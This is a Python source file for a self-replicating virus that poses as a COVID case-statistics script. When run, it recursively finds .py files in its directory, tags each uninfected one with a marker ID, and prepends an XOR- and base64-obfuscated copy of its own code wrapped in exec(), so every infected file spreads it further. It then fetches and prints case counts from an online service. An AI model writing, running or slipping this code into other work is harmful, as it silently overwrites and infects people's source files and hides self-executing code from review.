"""f918e578319e99bc8904"""
#payload = """"""

import os
import urllib.request
import json
import base64
import random
import datetime

vid = 'f918e578319e99bc8904'


def byte_xor(ba1, ba2):
    return bytes([a ^ b for a, b in zip(ba1, ba2)])

def encrypt(content):
    message_bytes = content.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    key = '%0{}x'.format(len(base64_bytes)) % random.randrange(16 ** len(base64_bytes))
    key = base64.b64encode(key.encode('ascii'))[:len(base64_bytes)]

    e_content = byte_xor(key, base64_bytes)
    return key, e_content


decrypt_str = "base64.b64decode(bytes([a ^ b for a, b in zip({}, {})])).decode('ascii')"

def decrypt(key, e_content):
    import base64
    def byte_xor(ba1, ba2):
        return bytes([a ^ b for a, b in zip(ba1, ba2)])
    content_64 = byte_xor(e_content, key)
    message_bytes = base64.b64decode(content_64)
    message = message_bytes.decode('ascii')
    return message


def get_subfiles(path):
    subfiles = []
    for e in os.scandir(path):
        if e.is_dir():
            subfiles += get_subfiles(e.path)
        elif e.path.endswith('.py'):
            subfiles.append(e.path)
    return subfiles


def get_corona_stats_by_country():
    url = 'https://corona-stats.online?top=10&format=json'
    req = urllib.request.Request(url)
    r = urllib.request.urlopen(req).read()
    content = json.loads(r.decode('utf-8'))['data']
    country_data = []
    for country in content:
        country_data.append((country['country'], country['cases']))
    country_data.sort(key=lambda x: x[1], reverse=True)
    country_data = country_data[:20]
    return country_data

def visualize_corona_data(corona_data):
    print('By the time', datetime.datetime.now())
    for c, n in corona_data:
        print(c, 'has', n, 'cases')

def infect(file_paths, self_path):
    with open(self_path, 'r') as vf:
        vf.readline()
        vf.readline()  # Passing payload & id - so reaching plain virus content
        virus_content = vf.read()

    uninfected_files = []
    for path in file_paths:
        with open(path, 'r') as f:
            fid = f.readline().replace('\n', '')
            if not fid == '"""{}"""'.format(vid):  # found an uninfected file
                f.seek(0)
                victim_content = f.read()
                uninfected_files.append((path, victim_content))

    for path, content in uninfected_files:
        with open(path, 'w') as f:
            #  file_content = 'payload = """{}"""\n'.format(content)
            file_content = virus_content
            key, encrypted_content = encrypt(file_content)

            formatted_decrypt_str = decrypt_str.format(key, encrypted_content)
            new_file = '"""{}"""\n'.format(vid) + \
                       '\n' + \
                       'import base64\n' + \
                       'exec({})\n'.format(formatted_decrypt_str) + \
                       content
            f.write(new_file)


def run():
    current_path = os.path.abspath(__file__)
    current_filename = current_path[current_path.rindex('/') + 1:]
    current_directory = current_path[:current_path.rindex('/')] + '/'

    infect(get_subfiles(current_directory), current_path)
    visualize_corona_data(get_corona_stats_by_country())
    #exec(payload)


run()
